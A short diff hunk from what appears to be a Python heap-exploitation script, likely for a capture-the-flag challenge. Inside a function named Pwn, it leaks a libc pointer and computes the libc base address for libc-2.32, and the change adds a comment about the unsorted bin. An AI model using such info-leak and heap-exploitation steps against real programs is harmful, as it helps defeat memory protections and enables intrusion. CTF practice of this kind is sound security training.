@@ -69,7 +69,7 @@ def Pwn():
  move(1,1)
  copy(1,0)
  libc_leak = u64(show(0).ljust(8,b'\0'))
- libc_base = libc_leak - (0x1e3c00 + ((heap_base >> 0xc )&0xff))
+ libc_base = libc_leak - (0x1e3c00 + ((heap_base >> 0xc )&0xff)) # Unsorted bin ends with NULL byte in libc-2.32. >_<
  print(hex(libc_base))
 
  add(1,0x18,p64(0)+b'\n')
